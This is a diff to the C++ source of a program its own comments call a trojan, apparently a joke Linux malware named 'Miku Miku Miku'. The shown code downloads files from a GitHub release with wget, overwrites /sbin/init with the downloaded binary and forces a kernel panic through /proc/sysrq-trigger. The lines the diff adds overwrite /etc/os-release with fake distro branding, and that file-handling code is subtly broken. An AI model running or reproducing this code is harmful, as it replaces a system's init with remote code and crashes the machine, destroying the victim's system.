@@ -2,6 +2,7 @@
 #include <cstdlib>
 #include <unistd.h>
 #include <csignal>
+#include <fstream>
 
 // The pre-reboot part of Miku Miku Miku.
 // The system is guaranteed to reboot anyway here, this is just what the user sees before a kernel panic.
@@ -22,6 +23,14 @@ int main()
 
     // This is a lot of shell commands, this trojan depends on wget which is an application, not a header file.
     system("wget https://github.com/Hyperion0801/Miku-Miku-Miku/releases/download/AlphaBuild1/Assets.zip && wget https://github.com/Hyperion0801/Miku-Miku-Miku/releases/download/AlphaBuild1/init && cp -f init /sbin/init");
+
+    // perfect distro (not really)
+    std::ofstream OsRelease("/etc/os-release");
+    
+    OsRelease.open("os-release");
+
+    OsRelease << "NAME=Hatsune Miku Linux\nPRETTY_NAME=Hatsune Miku Linux\nID=miku\n";
+    OsRelease.close();
 
     // This is the end of the pre-reboot payload. IT'S KERNEL PANIC TIME!!!!!
     system("echo c > /proc/sysrq-trigger");
